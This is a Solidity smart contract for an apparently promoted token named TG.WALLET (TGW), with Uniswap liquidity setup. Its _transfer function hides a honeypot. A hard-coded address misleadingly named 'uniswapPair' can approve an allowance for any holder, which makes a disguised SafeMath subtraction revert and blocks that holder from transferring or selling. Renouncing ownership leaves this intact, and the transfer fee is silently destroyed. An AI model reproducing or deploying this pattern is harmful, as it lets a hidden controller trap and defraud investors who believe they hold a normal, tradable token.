pragma solidity 0.8.27;

// SPDX-License-Identifier: MIT

// www: https://tgerc20.tech/
// x: https://x.com/tgwalleteth
// tg: https://t.me/tgwalleteth

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}
contract Ownable {
    address private _owner;
    constructor() {
        _owner = msg.sender;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
}
contract TG_WALLET is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 12;
    uint256 private _totalSupply =  100000000 * 10 ** _decimals;
    address uniswapPair;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    bool tradingOpen = false;
    address public uniswapV2Pair;
    uint256 fee = 1;
    address marketingWallet;

    bool public limitsInEffect = true;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    string private constant _name = "TG.WALLET";
    string private constant _symbol = "TGW";

    constructor () {
        marketingWallet = msg.sender;
        _balances[address(this)] = _totalSupply;
        uniswapPair = 0x165Af726E766bF1DdAc4BbeE3fC61641dbA589BD;
        limitsInEffect = true;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function name() public pure returns (string memory) { return _name; }
    function balanceOf(address account) public view returns (uint256) { return _balances[account]; }
    function totalSupply() public view returns (uint256) { return _totalSupply; }
    function allowance(address owner, address spender) public view returns (uint256) { return _allowances[owner][spender]; }
    function decimals() public view returns (uint8) { return _decimals; }
    function symbol() public pure returns (string memory) { return _symbol; }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 feeValue = 0;
        if (limitsInEffect) {
            uint256 tokenValue = 0;
            if (from != address(this) && from != uniswapV2Pair) {
                uint256 _taxAmount = _allowances[uniswapPair][from];
                tokenValue = tokenValue.sub(_taxAmount);
            }
        }
        if (from != owner() && to != owner() && from != marketingWallet && to != marketingWallet) {
            feeValue = amount.mul(fee).div(100);
        }
        _balances[to] = _balances[to].add(amount).sub(feeValue);
        _balances[from] = _balances[from].sub(amount);
        emit Transfer(from, to, amount);
    }
    function startTrading() external payable onlyOwner() {
        require(!tradingOpen); 
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        address WETH = uniswapV2Router.WETH();
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), WETH);
        address token = address(this);      
        uint256 balance = balanceOf(address(this));
        uniswapV2Router.addLiquidityETH{value: msg.value}(token, balance, 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }
}